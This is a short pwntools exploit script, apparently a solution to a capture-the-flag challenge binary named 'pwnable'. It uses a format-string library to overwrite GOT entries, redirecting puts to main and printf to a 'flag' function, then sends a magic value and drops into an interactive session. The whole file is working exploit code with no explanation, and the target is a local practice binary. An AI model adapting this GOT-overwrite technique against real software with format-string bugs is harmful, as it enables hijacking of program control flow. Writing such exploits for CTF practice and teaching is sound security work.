from pwn import *
from fmtstr import FormatString
from hexdump import hexdump

e = ELF('pwnable')
r = process("./pwnable")
#r = remote('localhost', 9001)
context.terminal = ['urxvt', '-e', 'bash', '-c']
fmt = FormatString(offset=6, written=0, bits=64)
fmt[e.got[b'puts']] = e.symbols[b'main']+21
payload, sig = fmt.build()

hexdump(payload)
log.info(payload)
r.sendline(payload)

#r.sendline("aaaaaaaa %7$p")

fmt = FormatString(offset=7, written=0, bits=64)
fmt[e.got[b'printf']] = e.symbols[b'flag']
payload, sig = fmt.build()
r.sendline(payload)

r.sendline(p64(0x1337))
r.interactive()
